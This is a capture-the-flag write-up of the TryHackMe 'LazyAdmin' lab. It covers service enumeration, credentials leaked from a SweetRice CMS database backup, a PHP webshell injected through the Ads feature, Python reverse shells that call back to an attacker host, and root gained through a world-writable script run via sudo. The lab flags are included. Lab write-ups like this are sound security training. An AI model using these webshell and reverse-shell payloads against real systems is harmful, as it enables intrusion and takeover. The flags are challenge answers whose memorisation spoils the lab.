# LazyAdmin — TryHackMe

**Difficulty:** Easy  
**Category:** Linux / Web / CMS  
**Date:** 03/06/2026  
**Status:** ✅ Completed

---

## 📋 Table of Contents

- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)

---

## 🔍 Reconnaissance

> Goal: identify the attack surface of the machine.

```bash
nmap -sC -sV -oN scan.txt <THM_IP_MACHINE>
```

**Open ports found:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |

**Initial observations:**
- Web server returning Apache default page — real content likely in a subdirectory
- SSH available but requires credentials

---

## 📡 Enumeration

> Goal: extract as much information as possible from the discovered services.

### Web — Directory Enumeration

```bash
gobuster dir -u http://<THM_IP_MACHINE> -w /usr/share/wordlists/dirb/common.txt
```

**Relevant findings:**

| Directory | Status |
|-----------|--------|
| `/content/` | 301 → accessible |

Navigating to `/content/` revealed a **SweetRice CMS v1.5.1** installation.

Second gobuster pass inside `/content/`:

```bash
gobuster dir -u http://<THM_IP_MACHINE>/content/ -w /usr/share/wordlists/dirb/common.txt
```

| Directory | Status |
|-----------|--------|
| `/content/as/` | 301 → admin panel |
| `/content/inc/` | 301 → internal files |
| `/content/attachment/` | 301 → accessible |

### MySQL Backup — Credential Exposure

Inside `/content/inc/`, a MySQL backup file was found and downloaded.

```bash
cat mysql_bakup.sql | grep -i "admin\|pass\|user"
```

Credentials extracted from the backup:

- **Username:** `manager`
- **Password hash:** `42f749ade7f9e195bf475f37a44cafcb` (MD5)

Hash cracked via [crackstation.net](https://crackstation.net):

- **Password:** `Password123`

---

## 💥 Exploitation

> Goal: gain initial access to the machine.

**Vulnerability found:** SweetRice 1.5.1 — authenticated PHP code injection via Ads feature

**Tools used:** Browser + PHP webshell + Netcat

### Step 1 — Login to admin panel

```
http://<THM_IP_MACHINE>/content/as/
# Username: manager
# Password: Password123
```

### Step 2 — Inject PHP webshell via Ads

Navigate to **Ads** in the dashboard and create a new ad:

- **Ads name:** `shell`
- **Ads code:**
```php
<?php system($_GET["cmd"]); ?>
```

### Step 3 — Verify RCE

```
http://<THM_IP_MACHINE>/content/inc/ads/shell.php?cmd=whoami
```

Output: `www-data` ✅

### Step 4 — Reverse shell

Listener on Kali:
```bash
nc -lvnp 4444
```

Payload via browser:
```
http://<THM_IP_MACHINE>/content/inc/ads/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Step 5 — Upgrade the shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Result:** Shell obtained as `www-data` ✅

---

## ⬆️ Privilege Escalation

> Goal: escalate privileges to root/Administrator.

### Stage 1 — www-data → root

Checked sudo permissions:

```bash
sudo -l
```

Output:
```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

`www-data` can run a Perl script as root without a password. Checked the script contents:

```bash
cat /home/itguy/backup.pl
```

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The script calls `/etc/copy.sh`. Checked permissions:

```bash
ls -la /etc/copy.sh
# -rw-r--rwx 1 root root 81 Nov 29 2019 /etc/copy.sh
```

`/etc/copy.sh` is **world-writable**. Injected a reverse shell:

```bash
echo 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<KALI_IP>\",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"' > /etc/copy.sh
```

Listener on Kali:

```bash
nc -lvnp 5555
```

Triggered the script:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

**Result:** Shell obtained as `root` ✅

---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| user.txt | /home/itguy/user.txt | `THM{63e5bce9271952aad1113b6f1ac28a07}` |
| root.txt | /root/root.txt | `THM{6637f41d0177b6f37cb20d775124699f}` |

---

## 📚 Lessons Learned

1. **CMS backup files can expose credentials** — always enumerate `/inc/`, `/backup/`, and similar directories for database dumps
2. **Default or weak passwords are common in CMS installations** — MD5 hashes are trivially cracked via rainbow tables
3. **Sudo misconfigurations are a reliable privesc vector** — always run `sudo -l` after gaining initial access; scripts called by sudo with writable dependencies are exploitable

---

## 🛠️ Tools Used

- `nmap`
- `gobuster`
- `netcat (nc)`
- `python3` (pty spawn)
- Browser (RCE via Ads panel)
- [crackstation.net](https://crackstation.net) (MD5 hash cracking)

---

*Writeup by GabrielMachado0*
